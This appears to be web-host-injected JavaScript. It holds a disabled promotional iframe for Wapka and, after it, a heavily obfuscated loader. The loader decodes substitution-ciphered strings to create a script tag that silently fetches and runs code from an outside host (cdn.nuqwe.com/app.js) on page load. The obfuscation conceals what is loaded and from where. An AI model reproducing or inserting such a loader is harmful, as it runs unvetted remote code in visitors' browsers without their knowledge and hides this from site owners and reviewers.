  var wk_frame = document.createElement('iframe');
  wk_frame.style = "background: none !important; border: 0px !important; box-shadow: none !important; margin: 0px !important; outline: 0px !important; padding: 0px !important; position: fixed !important; width: 100% !important; z-index: 2147483647 !important; height: 96px !important; max-width: 390px !important; right: 0px !important; bottom: 0px !important;";
  var html = ''
  html += '<html>'
  html += '  <head><style>body,html{height:100%;width:100%}body{-moz-osx-font-smoothing:grayscale;-webkit-font-smoothing:antialiased;font-family:"Segoe UI","Open Sans","Helvetica Neue",Roboto,Ubuntu,Arial,sans-serif;margin:0;overflow:hidden;-webkit-tap-highlight-color:transparent;-webkit-text-size-adjust:none;-moz-text-size-adjust:none;-ms-text-size-adjust:none;text-size-adjust:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.w{cursor:pointer;background-color:rgba(248,248,248,.95);border-radius:10px;box-shadow:rgba(0,0,0,.3) 0 3px 5px;height:calc(100% - 16px);margin:8px;overflow:hidden;position:relative;transition:background-color .3s,transform .3s;width:calc(100% - 16px);z-index:1}.w:hover{background-color:#fff}.w.r-b,.w.r-t{transform:translateX(120%)}.w.l-b,.w.l-t{transform:translateX(-120%)}.w.show{transform:translateX(0)}.cnts{display:flex;height:100%;width:100%}.img{height:80px;min-width:80px;-o-object-fit:cover;object-fit:cover;opacity:0;transition:opacity .3s;width:80px}.rtl .img{direction:rtl}.img.load{opacity:1}.cnt{color:#414a59;flex-grow:1;padding-left:10px}.rtl .cnt{direction:rtl}.type-1 .cnt,.type-2 .cnt,.type-3 .cnt{padding-right:30px}.type-0 .cnt{padding-right:45px}.cnt__t,.cnt__tx{-webkit-box-orient:vertical;display:-webkit-box;-webkit-line-clamp:2;margin:2px 0 0;max-height:35px;overflow:hidden;padding-bottom:2px}.cnt__t{font-size:16px;line-height:1.125}.cnt__tx{font-size:14px;line-height:1.286}.btn-close{align-items:center;background:0 0;border:0;cursor:pointer;display:flex;justify-content:center;padding:0;position:absolute;right:0;top:0;z-index:1}.type-1 .btn-close,.type-2 .btn-close,.type-3 .btn-close{height:25px;width:25px}.type-0 .btn-close{background-color:#f1f1f1;height:100%;width:40px}.type-2 .btn-close{-webkit-animation:a .3s forwards;animation:a .3s forwards;opacity:0;visibility:hidden}.type-3 .btn-close{bottom:0;top:auto}.btn-close__ic{fill:#414a59}.type-1 .btn-close__ic,.type-2 .btn-close__ic,.type-3 .btn-close__ic{opacity:.4;height:8px;width:8px}.type-0 .btn-close__ic{height:12px;width:12px}.ast{color:#aaa;display:none;font-size:10px;line-height:1;position:absolute;text-align:center}.ast-show .ast{display:block}.type-0 .ast,.type-3 .ast{right:0;top:2px}.type-1 .ast,.type-2 .ast{bottom:5px;right:2px;width:25px;z-index:-1}.type-0 .ast{width:40px;z-index:2}.type-3 .ast{width:25px;z-index:-1}@-webkit-keyframes a{0%{opacity:0}to{opacity:1;visibility:visible}}@keyframes a{0%{opacity:0}to{opacity:1;visibility:visible}}</style></head>'
  html += '  <body>'
  html += '      <div class="w r-b type-1 show">'
  html += '          <div class="cnts">'
  html += '              <div class="cnt"><a href="https://wapka.org/?ref=site" target="_blank"><h1 class="cnt__t"><b>Wapka.org</b> Create your own website..!<h1><p class="cnt__tx">Be creative & Earn Money</p></a></div>'
  html += '          </div>'
  html += '          <div class="btn-close" title="Close" onclick="return parent.wkf_remove(this.window);">'
  html += '              <svg class="btn-close__ic" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" height="24" width="24"><path d="M14.6 12l9-9c.3-.2.4-.6.4-.9 0-.4-.1-.7-.4-.9l-.8-.8c-.2-.3-.5-.4-.9-.4s-.7.1-.9.4l-9 9-9-9C2.8.1 2.5 0 2.1 0s-.7.1-.9.4l-.8.8c-.5.5-.5 1.3 0 1.9l9 9-9 9c-.3.1-.4.5-.4.8s.1.7.4.9l.8.8c.2.3.5.4.9.4s.7-.1.9-.4l9-9 9 9c.2.2.6.4.9.4.4 0 .7-.1.9-.4l.8-.8c.2-.2.4-.6.4-.9s-.1-.7-.4-.9l-9-9z"></path></svg>'
  html += '          </div>'
//  html += '          <div class="ast">Ads</div>'
  html += '      </div>'
  html += '  </body></html>'

if (0 && window.top == window.self) {
  document.body.appendChild(wk_frame);
  wk_frame.contentWindow.document.open();
  wk_frame.contentWindow.document.write(html);
  wk_frame.contentWindow.document.close();
  function wkf_remove() {
    //wk_frame.remove();
    wk_frame.style.display="none";
  }

  //window.addEventListener('load', function () {});
  ext_list = ["co","site","website","xyz", "co", "site", "co", "site"];
  target = 'https://blog.wapka.' + ext_list[(new Date).getUTCHours() % ext_list.length] + '/adstook';
  wk_frame.contentWindow.document.getElementsByClassName('cnt')[0].innerHTML = '<iframe src="' + target + '" frameborder="0" border="0" cellspacing="0"></iframe>';
}


var p$00a = 'p$00a' + (new Date().getTime()) + 'zz'; window[p$00a] = {a:'abcdefghijklmnopqrstuvwxyz0123456789lsf7dpu2wgxh5nk3q8m1aty9r4eiz0obcv6j', b:'{"AZIb":"i6cz6e", "BVIb":"bvceb6", "CXrr1":"an7d8", "DLtag":"i", "Emjk5":"", "XCge1s":"3.naqyd.fk5" , "Zt1":"3k3flm2.nd1", "ZZ1":"3.225k3.fhka7" }', c:'{"Abkr221":"mf8w31", "Bo9ssm":"//f7n.naqyd.fk5/l33.gm"}', d:'{"Ag4":"sk7r", "Bx1":"l33dn7C2wh7", "Cky":"m8f", "Dmg":"f8dl1dEhd5dn1"}'};
var _0x5d4b=['235913QVfbwv','slice','length','162209QBmAmV','14238hyOOTq','323207DTbifh','split','1DqiKtq','135866HTbavB','indexOf','call','27654SKXHbY','parse','undefined','32Ijckmz','keys','map','ceil','115980hcFVDy','values','join'];var _0x208c=function(_0x31a8d7,_0x5f36b3){_0x31a8d7=_0x31a8d7-0x167;var _0x5d4be1=_0x5d4b[_0x31a8d7];return _0x5d4be1;};(function(_0x276f94,_0x57c4ff){var _0x50057c=_0x208c;while(!![]){try{var _0x40d184=parseInt(_0x50057c(0x168))+parseInt(_0x50057c(0x16f))*parseInt(_0x50057c(0x179))+-parseInt(_0x50057c(0x176))+parseInt(_0x50057c(0x173))+parseInt(_0x50057c(0x16e))+-parseInt(_0x50057c(0x170))+parseInt(_0x50057c(0x16b))*-parseInt(_0x50057c(0x172));if(_0x40d184===_0x57c4ff)break;else _0x276f94['push'](_0x276f94['shift']());}catch(_0x411836){_0x276f94['push'](_0x276f94['shift']());}}}(_0x5d4b,0x45111),function(){var _0x1ba274=function(_0x2f3a9a){var _0x3f0bc4=_0x208c,_0x1894ba=Math[_0x3f0bc4(0x167)](this['a'][_0x3f0bc4(0x16d)]/0x2),_0x539548=this['a'][_0x3f0bc4(0x16c)](0x0,_0x1894ba),_0x5d8009=this['a'][_0x3f0bc4(0x16c)](_0x1894ba);decrypt=this[_0x2f3a9a][_0x3f0bc4(0x171)]('')[_0x3f0bc4(0x17b)](_0x28f433=>{var _0xd7612d=_0x3f0bc4;return _0x5d8009['split']('')['includes'](_0x28f433)?_0x539548[_0x5d8009[_0xd7612d(0x174)](_0x28f433)]:_0x28f433;})[_0x3f0bc4(0x16a)]('');try{return JSON[_0x3f0bc4(0x177)](decrypt);}catch{return decrypt;}},_0x57bb85=window[p$00a],_0x219d97=function(_0x28efac,_0x22a031){var _0x5bee8e=_0x208c,_0x3963a0=Object[_0x5bee8e(0x169)](_0x1ba274[_0x5bee8e(0x175)](_0x57bb85,Object[_0x5bee8e(0x17a)](_0x57bb85)[_0x28efac]));return typeof _0x22a031!=_0x5bee8e(0x178)?_0x3963a0[_0x22a031]:_0x3963a0;};window[p$00a]['x']=function(){return _0x219d97(0x1);};var _0xf1db57=document[_0x219d97(0x3,0x3)](_0x219d97(0x2,0x0));_0xf1db57[_0x219d97(0x3,0x2)]=_0x219d97(0x2,0x1),document[_0x219d97(0x3,0x0)][_0x219d97(0x3,0x1)](_0xf1db57),p$00a=undefined;}());
